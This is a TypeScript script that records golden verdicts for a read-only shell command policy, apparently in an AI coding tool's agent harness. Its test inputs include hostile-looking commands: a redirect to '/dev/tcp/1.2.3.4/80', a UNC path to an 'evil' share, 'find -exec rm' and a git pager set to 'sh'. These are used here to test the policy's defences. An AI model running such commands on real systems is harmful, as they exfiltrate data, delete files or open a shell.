/**
 * PHASE 3 oracle: the read-only policy evaluator for one parsed invocation.
 *
 * Spec: docs/specs/subagent-rust-port.md (Phase 3).
 *
 * `evaluateBashReadonlyPolicy` is the function that decides "does this one command count as
 * read-only" given an already-parsed invocation. It wires the gates (env assignments,
 * redirects, UNC paths, git normalization), the direct-argv shortcuts, the multiword prefix
 * table, the allow-any list, and the per-command policy. It is the seam above every table and
 * callback — porting it moves the decision, leaving only the grammar parse in TypeScript.
 *
 * Run: pnpm exec tsx scripts/capture-readonly-policy-golden.ts
 */
import { writeFileSync, mkdirSync } from "node:fs";

import { evaluateBashReadonlyPolicy } from "../apps/zcode-cli/packages/core/src/tool/handlers/bash-readonly-policy-argv.ts";

const OUT = new URL(
  "../apps/zcode-cli/packages/core/testdata/agent-profiles",
  import.meta.url,
).pathname;

/** Build a minimal BashCommandInvocation; only the fields the policy reads are set. */
function invocation(argv: string[], extra: Record<string, unknown> = {}) {
  return {
    argv,
    commandText: argv.join(" "),
    envAssignments: [],
    hasAssignmentPrefix: false,
    hasDynamicWords: false,
    hasRedirects: false,
    name: argv[0] ?? "",
    redirects: [],
    ...extra,
  } as unknown as Parameters<typeof evaluateBashReadonlyPolicy>[0];
}

const CASES: { name: string; input: Parameters<typeof evaluateBashReadonlyPolicy>[0] }[] = [
  // direct argv shortcuts
  { name: "direct_ip_addr", input: invocation(["ip", "addr"]) },
  { name: "direct_node_version", input: invocation(["node", "-v"]) },
  { name: "direct_python_version", input: invocation(["python3", "--version"]) },
  { name: "direct_history_bare", input: invocation(["history"]) },
  { name: "direct_history_number", input: invocation(["history", "12"]) },
  { name: "direct_history_junk", input: invocation(["history", "all"]) },

  // git
  { name: "git_status", input: invocation(["git", "status"]) },
  { name: "git_log_oneline", input: invocation(["git", "log", "--oneline"]) },
  { name: "git_commit_is_not_readonly", input: invocation(["git", "commit", "-m", "x"]) },
  { name: "git_push_is_not_readonly", input: invocation(["git", "push"]) },
  { name: "git_dangerous_global", input: invocation(["git", "-c", "core.pager=sh", "log"]) },

  // multiword prefix (gh auth status)
  { name: "gh_auth_status", input: invocation(["gh", "auth", "status"]) },
  { name: "gh_auth_login_is_not_readonly", input: invocation(["gh", "auth", "login"]) },
  { name: "gh_pr_dangerous_target", input: invocation(["gh", "pr", "checkout", "a/b/c"]) },

  // allow-any commands
  { name: "allow_any_ls", input: invocation(["ls"]) },
  { name: "allow_any_echo", input: invocation(["echo", "hello"]) },

  // per-command policy + flags
  { name: "find_readonly", input: invocation(["find", ".", "-name", "*.ts"]) },
  { name: "find_with_exec_is_not_readonly", input: invocation(["find", ".", "-exec", "rm"]) },
  { name: "cat_readonly", input: invocation(["cat", "file.txt"]) },
  { name: "cd_too_many_args", input: invocation(["cd", "/tmp", "extra"]) },

  // wrappers stripped
  { name: "command_wrapper", input: invocation(["command", "ls"]) },
  { name: "env_wrapper", input: invocation(["env", "ls"]) },
  { name: "sudo_is_not_stripped", input: invocation(["sudo", "ls"]) },

  // gates
  { name: "unsafe_env_assignment", input: invocation(["ls"], { envAssignments: [{ name: "PATH", value: "/x" }] }) },
  { name: "safe_env_assignment", input: invocation(["ls"], { envAssignments: [{ name: "LANG", value: "C" }] }) },
  { name: "unsafe_redirect", input: invocation(["cat"], { hasRedirects: true, redirects: [{ operator: ">", target: "/dev/tcp/1.2.3.4/80" }] }) },
  { name: "dev_null_redirect_ok", input: invocation(["cat"], { hasRedirects: true, redirects: [{ operator: ">", target: "/dev/null" }] }) },
  { name: "input_redirect_ok", input: invocation(["cat"], { hasRedirects: true, redirects: [{ operator: "<", target: "in.txt" }] }) },
  { name: "unc_path_rejected", input: invocation(["cat", "\\\\evil\\share\\f"]) },

  // empty / unknown
  { name: "empty_argv", input: invocation([]) },
  { name: "unknown_command", input: invocation(["zzz-not-real"]) },
];

const results: Record<string, boolean | null> = {};
for (const testCase of CASES) {
  const verdict = evaluateBashReadonlyPolicy(testCase.input);
  results[testCase.name] = verdict === undefined ? null : verdict;
}

mkdirSync(OUT, { recursive: true });
writeFileSync(`${OUT}/readonly-policy-golden.json`, JSON.stringify({ cases: CASES, verdicts: results }, null, 2) + "\n");
const yes = Object.values(results).filter((v) => v === true).length;
const no = Object.values(results).filter((v) => v === false).length;
const undef = Object.values(results).filter((v) => v === null).length;
console.log(`captured ${CASES.length} policy cases (${yes} read-only, ${no} not, ${undef} no-opinion)`);
for (const [name, verdict] of Object.entries(results)) {
  console.log(`  ${verdict === null ? "NONE " : verdict ? "TRUE  " : "FALSE "} ${name}`);
}
